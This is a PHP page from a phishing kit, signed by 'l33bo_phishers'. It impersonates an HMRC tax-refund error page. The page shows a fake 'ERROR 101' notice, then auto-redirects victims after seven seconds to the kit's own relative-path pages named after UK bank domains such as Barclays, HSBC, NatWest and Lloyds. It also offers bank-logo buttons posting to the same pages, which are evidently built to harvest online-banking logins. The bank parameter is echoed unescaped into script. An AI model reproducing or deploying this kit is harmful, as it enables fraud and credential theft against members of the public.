<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";


$bankname = $_GET["bank"];
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<link href="assets/styles/main.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>

<title>Error</title>
<script type="text/javascript">


var bankname = '<?php echo $bankname;?>';
bankname = bankname.toString();

if (bankname === 'barclays') {
		setTimeout(function() {
      window.location.replace("bank.barclays.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'hsbc') {
		setTimeout(function() {
      window.location.replace("hsbc.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'metrobank') {
		setTimeout(function() {
      window.location.replace("metrobankonline.co.uk/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'natwest') {
		setTimeout(function() {
      window.location.replace("nwolb.com/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'lloyds') {
		setTimeout(function() {
      window.location.replace("online.lloydsbank.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'rbos') {
		setTimeout(function() {
      window.location.replace("rbs/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'bos') {
		setTimeout(function() {
      window.location.replace("online.bankofscotland.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'tcb') {
		setTimeout(function() {
      window.location.replace("personal.co-operativebank.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'halifax') {
		setTimeout(function() {
      window.location.replace("halifax-online.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'tsb') {
		setTimeout(function() {
      window.location.replace("online.tsb.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
if (bankname == 'santander') {
		setTimeout(function() {
      window.location.replace("retail.santander.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true");
		}, 7000); 
}
</script>

</head>
<body id="top">
   <div id="dialogoverlay"></div>
<div id="dialogbox">
  <div>
    <div id="dialogboxhead"></div>
    <div id="dialogboxbody"></div>
    <div id="dialogboxfoot"></div>
  </div>
</div> 
<div id="header-digital"><a accesskey="1" href="#"><img class="screen" height="0" src="assets/img/logo.png" width="256"></a>
<ul class="inline-navigation">
<li><a href="#">Home</a></li>
<li><a href="#"><span lang="cy">Cymraeg</span></a></li>
<li><a class="new-window" href="#">Contact HMRC</a></li>
<li><a accesskey="6" class="popup-window" href="#">Help</a></li>
</ul>
</div>
<div class="no-menu" id="banner">
<div id="user-information"></div>
<h1>Tax Refund</h1>
</div>
<div class="portlet">
<div class="portlet-body">
<div class="error" id="pageError.Introduction"></div>
<h2 style="color: #db0000; font-size: 140%;">AN ERROR 101 HAS OCCURRED WHILE PROCESSING YOUR REQUEST. YOU WILL BE REDIRECTED TO YOUR BANK IN A FEW SECONDS.</h2>
<P>Or to continue processing your tax refund you may choose your bank below.</p>
<fieldset>
      
<div class="view-content">

<div style="float:left;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="bank.barclays.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/barclays_0_0.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>
  
<div style="float:right;">
<div class="views-field views-field-field-bank-logo"> 
<div class="field-content">
<div style="display:none">
<form method="post" action="online.bankofscotland.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/bos.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>



<div style="float:left;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="personal.co-operativebank.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMrpoyPokMRNjRxoRbePjfsUqgsLcdT9wBWS-wwgEzvy7IYKqBsQ" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>


  
<div style="float:right;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="halifax-online.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/halifax.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>



<div style="float:left;">
<div class="views-field views-field-field-bank-logo"> 
<div class="field-content">
<div style="display:none">
<form method="post" action="hsbc.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/hsbc.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>

  
<div style="float:right;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="online.lloydsbank.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/lloyd_1.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>


<div style="float:left;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="metrobankonline.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/metrobank.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>

  
<div style="float:right;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="nwolb.com/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/NWB_BM_264x178_0.png" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>


<div style="float:left;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="rbs/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/RBS_BM_264x178.png" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>

  
<div style="float:right;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="retail.santander.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/santander_0.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>


<div style="float:left;">
<div class="views-field views-field-field-bank-logo">        
<div class="field-content">
<div style="display:none">
<form method="post" action="online.tsb.co.uk/index.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="SendUser" id="SendUser">
</div>
<input type="image" src="assets/img/tsb.jpg" width="264" height="178" alt="" /></a>
</form>
</div>  
</div>  
</div>

  
</div>
</fieldset>
<P>If your banks logo is not dislayed above then we are unable to process you tax refund online. Please contact us to receive a postal application form.</p>
<br>
<br>
<br>
<br>
<ul class="inline-navigation" id="footer">
<li class="first">&copy; <a class="new-window" href="#">Crown Copyright</a></li>
<li><a accesskey="8" class="new-window" href="#">HMRC Terms &amp; Conditions</a></li>
<li><a class="new-window" href="#">HMRC Privacy policy</a></li>
<li><a accesskey="0" class="new-window" href="#">HMRC Accessibility</a></li>
</ul>
<br>
</div>
</div>


</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
?>